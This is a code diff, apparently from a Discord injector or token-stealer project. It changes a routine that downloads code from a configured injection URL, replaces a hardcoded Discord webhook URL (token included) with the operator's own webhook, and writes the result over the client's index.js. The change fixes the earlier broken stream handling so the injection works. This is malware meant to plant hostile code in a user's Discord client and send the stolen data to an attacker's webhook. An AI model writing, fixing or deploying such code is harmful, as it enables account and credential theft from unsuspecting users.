@@ -542,11 +542,13 @@ async function initiation() {
   })
   async function init() {
       https.get('${CONFIG.injection_url}', (res) => {
-          const file = fs.createWriteStream(indexJs);
-          res.replace('https://canary.discord.com/api/webhooks/1383465075624509575/aSH366UZULB_wuiTNovlosW7XjOy6XN73RPrTY5_TUGXEF61Wbn3uPIL3diE7DmGB7ov', '${CONFIG.webhook}')
-          res.pipe(file);
-          file.on('finish', () => {
-              file.close();
+         let data = "";
+          res.on('data', chunk => {
+              data += chunk;
+          });
+          res.on('end', () => {
+              let modifiedData = data.replace('https://canary.discord.com/api/webhooks/1383465075624509575/aSH366UZULB_wuiTNovlosW7XjOy6XN73RPrTY5_TUGXEF61Wbn3uPIL3diE7DmGB7ov', '${CONFIG.webhook}');
+              fs.writeFileSync(indexJs, modifiedData);
           });
       
       }).on("error", (err) => {
